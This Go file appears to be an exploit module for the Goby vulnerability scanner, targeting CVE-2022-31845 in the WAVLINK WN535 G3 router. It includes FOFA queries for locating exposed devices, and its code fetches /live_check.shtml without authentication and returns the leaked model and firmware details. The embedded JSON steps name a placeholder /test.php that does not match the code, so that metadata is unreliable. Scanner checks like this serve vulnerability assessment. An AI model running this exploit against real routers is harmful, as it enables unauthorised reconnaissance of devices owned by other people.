package exploits

import (
	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
	"strings"
)

func init() {
	expJson := `{
    "Name": "WAVLINK WN535 G3 router live_ Check.shtml file information disclosure vulnerability (CVE-2022-31845)",
    "Description": "<p>WAVLINK WN535 is a dual band 4G LTE intelligent router.</p><p>There is a security vulnerability in WAVLINK WN535 G3 M35G3R.V5030.180927, which originates in live_ There is a vulnerability in check.shtml. Attackers can use this vulnerability to obtain sensitive router information by executing exec cmd functions.</p><p></p><p> </p>",
    "Product": "WAVLINK-WN535",
    "Homepage": "https://www.wavlink.com/",
    "DisclosureDate": "2022-07-13",
    "Author": "featherstark@outlook.com",
    "FofaQuery": "body=\"firstFlage\"",
    "GobyQuery": "body=\"firstFlage\"",
    "Level": "2",
    "Impact": "<p>There is a security vulnerability in WAVLINK WN535 G3 M35G3R.V5030.180927, which originates in live_ There is a vulnerability in check.shtml. Attackers can use this vulnerability to obtain sensitive router information by executing exec cmd functions.</p><p/><p> </p>",
    "Recommendation": "<p>There is currently no detailed solution manufacturer's homepage update:</p><p><a href=\"https://www.wavlink.com/zh_cn/index.html\">https://www.wavlink.com/zh_cn/index.html</a></p>",
    "References": [
        "https://cxsecurity.com/cveshow/CVE-2022-31845/"
    ],
    "Is0day": false,
    "HasExp": true,
    "ExpParams": [],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "Tags": [
        "Information Disclosure"
    ],
    "VulType": [
        "Information Disclosure"
    ],
    "CVEIDs": [
        "CVE-2022-31845"
    ],
    "CNNVD": [
        "CNNVD-202206-1298"
    ],
    "CNVD": [],
    "CVSSScore": "7.5",
    "Translation": {
        "CN": {
            "Name": "WAVLINK WN535 G3 路由器 live_check.shtml 文件信息泄露漏洞（CVE-2022-31845）",
            "Product": "WAVLINK-WN535",
            "Description": "<p>WAVLINK WN535是一款双频 4G LTE 智能路由器。</p><p>WAVLINK WN535 G3 M35G3R.V5030.180927版本存在安全漏洞，该漏洞源于live_check.shtml 中存在漏洞。攻击者利用该漏洞通过执行 exec cmd 函数获取敏感的路由器信息。</p>",
            "Recommendation": "<p>目前没有详细的解决方案提供，请关注厂商主页更新：<a href=\"https://www.wavlink.com/zh_cn/index.html\">https://www.wavlink.com/zh_cn/index.html</a><br></p>",
            "Impact": "<p>WAVLINK WN535 G3 M35G3R.V5030.180927版本存在安全漏洞，该漏洞源于live_check.shtml 中存在漏洞。攻击者利用该漏洞通过执行 exec cmd 函数获取敏感的路由器信息。<br></p>",
            "VulType": [
                "信息泄露"
            ],
            "Tags": [
                "信息泄露"
            ]
        },
        "EN": {
            "Name": "WAVLINK WN535 G3 router live_ Check.shtml file information disclosure vulnerability (CVE-2022-31845)",
            "Product": "WAVLINK-WN535",
            "Description": "<p>WAVLINK WN535 is a dual band 4G LTE intelligent router.</p><p>There is a security vulnerability in WAVLINK WN535 G3 M35G3R.V5030.180927, which originates in live_ There is a vulnerability in check.shtml. Attackers can use this vulnerability to obtain sensitive router information by executing exec cmd functions.</p><p></p><p> </p>",
            "Recommendation": "<p>There is currently no detailed solution manufacturer's homepage update:<br></p><p><a href=\"https://www.wavlink.com/zh_cn/index.html\">https://www.wavlink.com/zh_cn/index.html</a><br></p>",
            "Impact": "<p>There is a security vulnerability in WAVLINK WN535 G3 M35G3R.V5030.180927, which originates in live_ There is a vulnerability in check.shtml. Attackers can use this vulnerability to obtain sensitive router information by executing exec cmd functions.</p><p><span style=\"color: rgb(22, 51, 102); font-size: 16px;\"></span></p><p><span style=\"color: rgb(22, 51, 102); font-size: 16px;\"></span> </p>",
            "VulType": [
                "Information Disclosure"
            ],
            "Tags": [
                "Information Disclosure"
            ]
        }
    },
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "PocId": "10781"
}`


	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		func(exp *jsonvul.JsonVul, hostinfo *httpclient.FixUrl, stepLogs *scanconfig.SingleScanConfig) bool {
			uri_1 := "/live_check.shtml"
			cfg_1 := httpclient.NewGetRequestConfig(uri_1)
			cfg_1.VerifyTls = false
			if resp_1, err := httpclient.DoHttpRequest(hostinfo, cfg_1); err == nil {
				if resp_1.StatusCode == 200 && strings.Contains(resp_1.Utf8Html, "Model=") && strings.Contains(resp_1.Utf8Html, "FW_Version=") {
					return true
				}
			}
			return false
		},
		func(expResult *jsonvul.ExploitResult, ss *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {
			uri := "/live_check.shtml"
			cfg := httpclient.NewGetRequestConfig(uri)
			cfg.VerifyTls = false
			if resp_1, err := httpclient.DoHttpRequest(expResult.HostInfo, cfg); err == nil {
				if resp_1.StatusCode == 200 && strings.Contains(resp_1.Utf8Html, "Model=") && strings.Contains(resp_1.Utf8Html, "FW_Version=") {
					expResult.Output = resp_1.Utf8Html
					expResult.Success = true
				}
			}
			return expResult
		},
	))
}
